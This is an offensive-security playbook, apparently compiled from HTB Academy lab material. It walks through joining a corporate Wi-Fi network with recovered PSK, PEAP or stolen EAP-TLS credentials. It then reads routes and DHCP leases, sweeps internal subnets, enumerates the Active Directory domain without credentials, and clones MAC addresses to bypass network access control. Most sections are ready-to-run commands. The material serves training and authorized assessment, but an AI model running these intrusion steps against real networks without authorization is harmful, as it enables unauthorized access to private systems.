# Wireless - From wireless access to the internal network

## Connecting from the command line for every authentication type

**Trigger:** You hold a PSK, an enterprise credential pair, or a client certificate, and need a scripted association.

Use `wpa_supplicant` with an explicit configuration rather than the desktop network manager, because the GUI hides which key management was negotiated, cannot express the enterprise options you need, and gives you nothing to repeat. The configuration shape differs by authentication type and each has a detail that catches people. For WPA2-PSK, `wpa_passphrase` derives the key and writes the config for you. For WPA3, the same config needs `key_mgmt=SAE` and `ieee80211w=2`, and omitting the latter causes the association to fail because PMF is mandatory under SAE. For enterprise PEAP, the identity must carry the domain in the form the RADIUS server expects — `DOMAIN\user` with the backslash escaped in the config file — and you will usually want no CA certificate configured, since you are deliberately not validating the server you just impersonated. For EAP-TLS you need the client certificate and private key, which you only have if you extracted them from a compromised endpoint. After association always run DHCP explicitly; a successful association with no address means the supplicant connected and the network did not give you a lease, which is a different problem entirely and often indicates NAC.

```bash
# WPA2-PSK
wpa_passphrase "CorpWiFi" 'RecoveredPassphrase' > psk.conf
sudo wpa_supplicant -B -i wlan0 -c psk.conf && sudo dhclient wlan0

# WPA3-SAE — ieee80211w=2 is mandatory, not optional
cat > sae.conf <<'EOF'
network={
    ssid="CorpWiFi"
    key_mgmt=SAE
    psk="RecoveredPassphrase"
    ieee80211w=2
}
EOF

# WPA2-Enterprise PEAP-MSCHAPv2
cat > ent.conf <<'EOF'
network={
    ssid="CorpWiFi-ENT"
    key_mgmt=WPA-EAP
    eap=PEAP
    identity="CORP\\jdorian"
    password="RecoveredPassword"
    phase1="peaplabel=0"
    phase2="auth=MSCHAPV2"
}
EOF

# EAP-TLS, if you extracted a client certificate
cat > tls.conf <<'EOF'
network={
    ssid="CorpWiFi-ENT"
    key_mgmt=WPA-EAP
    eap=TLS
    identity="jdorian@corp.local"
    client_cert="/root/client.pem"
    private_key="/root/client.key"
    private_key_passwd="password"
}
EOF

sudo wpa_supplicant -B -i wlan0 -c ent.conf
sudo dhclient wlan0
sudo wpa_cli -i wlan0 status               # association state and negotiated suite
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — Compromising an Enterprise Wi-Fi Network; offsecexams.com OSWP cheatsheet

## Reading the routing table for what the WLAN actually reaches

**Trigger:** The association succeeded and you have an address.

The routing table is the single most informative artefact at this point, because it tells you whether the wireless network you just broke into is a dead end or an entry point. A default route through a gateway on your own subnet and nothing else is a NAT'd segment. Additional routes to private ranges mean the WLAN is joined to internal networks and the finding is much more serious. Read the interface names carefully as well — if your attack host has other interfaces, distinguish routes belonging to the wireless interface from routes belonging to a management or VPN interface, because attributing an internal route to the wrong interface is how people report a segmentation failure that does not exist. Pull the DHCP lease too: it frequently carries internal DNS servers and a domain search suffix, and a domain suffix is the name of the Active Directory domain, which is the single most useful string for everything that follows. Then test reachability into private space directly rather than trusting the routing table, because a network can route packets that a firewall then drops, and the difference is exactly what you are assessing.

```bash
ip addr show wlan0
ip route ; sudo netstat -rn
#   0.0.0.0      172.16.10.60   0.0.0.0        UG  wlan0
#   172.16.10.0  0.0.0.0        255.255.255.0  U   wlan0     <- internal range reached

# The lease usually names the domain and the internal resolvers
cat /var/lib/dhcp/dhclient.leases | grep -E "domain-name|domain-search|domain-name-servers"
cat /etc/resolv.conf

# Reachability, not just routability
for net in 10.0.0 172.16.10 192.168.1; do
  sudo nmap -sn -n --max-retries 1 ${net}.0/24 2>/dev/null | grep -B1 "Host is up"
done
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — Compromising an Enterprise Wi-Fi Network, AD Enumeration & Internal Foothold

## Sweeping the subnet and building the host table

**Trigger:** You have a route into an internal range and need to know what is on it.

Start with a ping sweep to establish which addresses are alive, then port-scan only those, which is far faster than scanning the range. Run the sweep more than once: on a wireless link with packet loss, one or two hosts routinely fail to answer a single probe and disappear from the results, and missing the domain controller because of one dropped packet is a real way to lose an afternoon. Put the results into a table immediately, because the shape of the port list identifies the role of each host at a glance and the roles are what drive the next step — 88, 389, 445 and 3268 together is a domain controller; 80 alone is a web server worth a full port scan; 22 with 53 and 80 is usually an appliance. Then do a full port scan on the hosts that looked uninteresting, because the top-1000 scan misses exactly the services that matter, and WinRM on 5985 is the most common example: it does not appear in a default scan and it is frequently the way onto a host when SMB gives you nothing.

```bash
# Ping sweep, run more than once — wireless loses probes
sudo nmap -v -n -sn 172.16.10.0/24 | awk '/is up/{print up}; {gsub(/\(|\)/,""); up=$NF}'
sudo nmap -v -n -sn 172.16.10.0/24 -oG - | awk '/Up/{print $2}' > live.txt

# Top ports across the live hosts
sudo nmap --open -iL live.txt -oA sweep

# Full scan on anything that looked thin — 5985 hides here
sudo nmap --open -T4 -p- 172.16.10.71

# Role identification from the port list:
#   53,88,135,139,389,445,464,593,636,3268,3269   domain controller
#   80,443 only                                    web server; full scan it
#   5985 / 5986                                    WinRM — frequently the way in
#   22,53,80                                       appliance / RADIUS / gateway
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — AD Enumeration & Internal Foothold

## Identifying the domain from the wireless segment

**Trigger:** The sweep found a host with Kerberos and LDAP open, or you need the domain name before authenticating.

Before using any credential you need the domain name and the domain controller's address, and both are obtainable without authenticating. An unauthenticated SMB connection returns the domain name and the host name in the negotiation, which `netexec` displays in its first line of output — this is the fastest route and works against any Windows host, not only the domain controller. LDAP will answer an anonymous query for the root DSE, which returns the naming contexts and therefore the full distinguished name of the domain. DNS is the third route and often the richest: if the internal resolver from your DHCP lease answers you, the Kerberos and LDAP service records name every domain controller in the domain. Collect all three, because they cross-check each other and because the DNS route may reveal domain controllers that are not on your subnet, which tells you the internal network extends beyond what you can currently reach.

```bash
# SMB negotiation names the domain and host without credentials
nxc smb 172.16.10.72
#   SMB  172.16.10.72  445  WIN-DC01  [*] Windows ... (name:WIN-DC01) (domain:corp.local) (signing:True)

# LDAP root DSE, anonymous
ldapsearch -x -H ldap://172.16.10.72 -s base namingContexts defaultNamingContext

# DNS service records from the internal resolver
dig @172.16.10.72 -t SRV _ldap._tcp.dc._msdcs.corp.local
dig @172.16.10.72 -t SRV _kerberos._tcp.corp.local

# Add the domain to your hosts file — Kerberos needs name resolution to work
echo "172.16.10.72  corp.local  WIN-DC01.corp.local  WIN-DC01" | sudo tee -a /etc/hosts

# Clock skew breaks Kerberos; sync to the DC
sudo ntpdate 172.16.10.72 || sudo rdate -n 172.16.10.72
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — AD Enumeration & Internal Foothold

## When the wireless network hands out no useful access

**Trigger:** Association succeeds but there is no address, no route beyond the gateway, or every internal probe is filtered.

Three distinct situations produce this and they need different responses. **No DHCP lease after a successful association** usually means network access control: the network authenticated your credential at the wireless layer and then declined to admit the device, typically because it is checking a certificate, a posture agent or a MAC allow-list. The workaround is to impersonate a device that is already admitted — clone the MAC of an authorised station observed in the survey — and to consider whether the credential you used is meant for user devices at all. **A lease with no route beyond the gateway** is a properly segmented network, which for a guest SSID is the correct configuration and is a negative result to record rather than a problem to solve; check whether the gateway itself is dual-homed before accepting it. **A lease with routes but everything filtered** means a firewall between the WLAN and the internal ranges, and the useful next step is to map what *is* permitted, since a rule set that allows DNS or HTTP to internal servers gives you both a target and a tunnel. In all three cases the other SSIDs on the same physical AP are worth testing, because VLAN assignment between co-located networks is a frequent misconfiguration.

```bash
# No lease? Watch the exchange, then try a known-good MAC
sudo dhclient -v wlan0
sudo tcpdump -i wlan0 -n port 67 or port 68
sudo ip link set wlan0 down && sudo macchanger -m <observed-authorised-station> wlan0
sudo ip link set wlan0 up && sudo dhclient wlan0

# 802.1X on the wired side of the same story
sudo tcpdump -i wlan0 -n ether proto 0x888e

# Route but filtered? Map what is actually permitted
sudo nmap -Pn -n -p 53,80,443,445,3389,88 172.16.10.0/24 --open --max-retries 1
sudo nmap -Pn -sU -p 53,161 172.16.10.0/24 --open

# Gateway dual-homed?
sudo nmap -sV -O <gateway>
snmpwalk -v2c -c public <gateway> 1.3.6.1.2.1.4.20

# Other SSIDs on the same radio (BSSIDs differing in the last octet) may land
# on a different VLAN -> recon-and-survey.md
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — Abusing the Guest Wi-Fi Network; operator practice
